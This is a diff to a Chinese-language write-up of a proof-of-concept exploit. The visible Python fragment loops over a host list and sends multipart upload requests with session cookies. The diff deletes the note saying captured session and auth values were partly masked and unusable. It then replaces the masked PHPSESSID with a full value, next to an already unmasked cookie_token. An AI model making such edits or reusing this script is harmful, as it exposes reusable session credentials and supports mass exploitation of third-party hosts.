@@ -20,7 +20,6 @@ schema_version: "1"
 
 ## 核对与使用边界
 
-- 凭据处理：本文抓包中的可识别会话/防伪或认证值已仅将中段替换为星号，保留首尾及原长度便于对照；遮罩后的历史值不能作为可用登录凭据。原操作、请求方法和攻击表达式保留。
 
 本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。
 
@@ -71,7 +70,7 @@ for host in test.readlines():
     123123test
     ------WebKitFormBoundary5j2IsrTFPjJCVtwU - -"""
     headers = {
-        "Cookie": "PHPSESSID=shp********************4f1; think_language=zh-CN; cookie_token=8ff04b9bba8b6abf30ab5e0be6cceea2192c9cf7a90d73b2d34d025d84feea2d",
+        "Cookie": "PHPSESSID=shp3gipo9moaj58kp9n8sbi4f1; think_language=zh-CN; cookie_token=8ff04b9bba8b6abf30ab5e0be6cceea2192c9cf7a90d73b2d34d025d84feea2d",
         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
         "Connection": "close",
         "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_1_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
